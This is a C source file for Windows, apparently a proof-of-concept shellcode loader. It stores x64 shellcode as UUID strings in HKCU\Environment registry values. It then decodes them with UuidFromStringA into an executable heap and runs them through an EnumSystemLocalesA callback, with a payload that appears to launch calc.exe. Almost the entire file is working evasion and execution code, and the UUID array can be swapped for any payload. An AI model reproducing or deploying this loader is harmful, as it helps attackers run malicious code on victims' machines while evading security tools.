#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")


const char* uuids[] =
{
    "e48348fc-e8f0-00c0-0000-415141505251",
    "d2314856-4865-528b-6048-8b5218488b52",
    "728b4820-4850-b70f-4a4a-4d31c94831c0",
    "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
    "48514152-528b-8b20-423c-4801d08b8088",
    "48000000-c085-6774-4801-d0508b481844",
    "4920408b-d001-56e3-48ff-c9418b348848",
    "314dd601-48c9-c031-ac41-c1c90d4101c1",
    "f175e038-034c-244c-0845-39d175d85844",
    "4924408b-d001-4166-8b0c-48448b401c49",
    "8b41d001-8804-0148-d041-5841585e595a",
    "59415841-5a41-8348-ec20-4152ffe05841",
    "8b485a59-e912-ff57-ffff-5d48ba010000",
    "00000000-4800-8d8d-0101-000041ba318b",
    "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
    "c48348d5-3c28-7c06-0a80-fbe07505bb47",
    "6a6f7213-5900-8941-daff-d563616c632e",
    "00657865-9090-9090-9090-909090909090"
};

int Error(const char* msg) {
	printf("%s (%u)\n", msg, GetLastError());
	return -1;
}

int main() {
	char env[] = { 'E','n','v','i','r','o','n','m','e','n','t',0 };
    int uuids_count = sizeof(uuids) / sizeof(uuids[0]);

    printf("[+] Allocate a block of memory from the heap\n");
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* hmem = HeapAlloc(hHeap, 0, 0x1000);
    DWORD_PTR ptr_ = (DWORD_PTR)hmem;

    for(int i = 0; i < uuids_count; i++) {
        char uuid[10] = "uuid";
        char num[10];
        sprintf_s(num, "%ld", i);
        lstrcatA(uuid, num);
        if (RegSetKeyValueA(HKEY_CURRENT_USER, env, uuid, REG_SZ, uuids[i], 37))
            return Error("[-] Failed in RegSetKeyValueA\n");
        
        printf("[+] %s created under HKEY_CURRENT_USER/%s\n", uuid, env);

    }

    printf("\n\n[+] Done\n\n");
    Sleep(1000);

    printf("[+] Reading UUIDs data from the created Registry key's values\n");
    printf("\n[+] Convert a string to a UUID.\n\n");
    DWORD pcbData = 1000;
    char** uuidsNew = (char**)malloc(uuids_count * sizeof(char*));
    char uuidOut[37];
    for (int i = 0; i < uuids_count; i++) {
        char uuid[10] = "uuid";
        char num[10];

        sprintf_s(num, "%ld", i);
        lstrcatA(uuid, num);
        RegGetValueA(HKEY_CURRENT_USER, env, uuid, RRF_RT_REG_SZ, NULL, uuidOut, &pcbData);
        uuidsNew[i] = uuidOut;
        printf("uuid[%d] = %s\n", i, uuidsNew[i]);
        Sleep(100);
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuidsNew[i], (UUID*)ptr_);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA != RPC_S_OK\n");
            CloseHandle(hmem);
            return -1;
        }
        ptr_ += 16;
    }
    

    printf("\n[+] Run the Sh3llc0de\n");
    EnumSystemLocalesA((LOCALE_ENUMPROCA)hmem, 0);
    CloseHandle(hmem);


}